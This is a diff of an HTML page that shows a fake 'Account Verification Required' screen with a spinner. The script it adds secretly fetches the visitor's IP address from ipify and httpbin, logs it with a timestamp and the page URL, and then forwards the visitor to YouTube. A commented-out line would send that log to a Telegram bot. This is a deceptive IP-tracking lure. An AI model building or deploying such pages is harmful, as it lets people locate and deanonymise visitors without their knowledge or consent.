@@ -1,18 +1,32 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Document Verification Required</title>
-    <meta http-equiv="refresh" content="0;url=/track">
-    <style>
-        body { font-family: Arial; text-align: center; padding: 50px; }
-        .loading { font-size: 18px; color: #666; }
-    </style>
-</head>
-<body>
-    <div class="loading">Please wait while we verify your document...</div>
-    <script>
-        // Auto redirect to tracker
-        window.location.href = '/track';
-    </script>
+<head><title>Access Required</title></head>
+<body style="background:linear-gradient(45deg,#667eea 0%,#764ba2 100%);height:100vh;margin:0;display:flex;align-items:center;justify-content:center;font-family:'Segoe UI',sans-serif">
+<div style="background:white;padding:40px;border-radius:20px;box-shadow:0 20px 40px rgba(0,0,0,0.1);text-align:center;max-width:400px">
+<img src="https://emojipedia-us.s3.dualstack.us-west-1.amazonaws.com/thumbs/120/apple/285/verifying-inbox-tray_270f-fe0f.png" width="60" style="margin-bottom:20px">
+<h2 style="color:#333;margin:0 0 20px">Account Verification Required</h2>
+<p style="color:#666;margin:0 0 30px">Please wait while we verify your access...</p>
+<div style="width:50px;height:50px;border:4px solid #f3f3f3;border-top:4px solid #667eea;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px"></div>
+<p style="color:#999;font-size:14px">This will redirect automatically</p>
+</div>
+<style>@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>
+<script>
+// IP Track
+fetch('https://api.ipify.org?format=json')
+.then(r=>r.json())
+.then(data=>{
+  fetch('https://httpbin.org/ip')
+  .then(r=>r.json())
+  .then(ipdata=>{
+    const log={ip:data.ip,origin:ipdata.origin,time:new Date().toISOString(),url:window.location.href};
+    console.log('🎯 LOCATION:',log); // Replit console میں دیکھیں
+    
+    // آپ کا Telegram bot (optional)
+    // fetch('https://api.telegram.org/botTOKEN/sendMessage?chat_id=ID&text='+encodeURIComponent(JSON.stringify(log)))
+  });
+});
+
+setTimeout(()=>location.href='https://youtube.com',2500);
+</script>
 </body>
 </html>
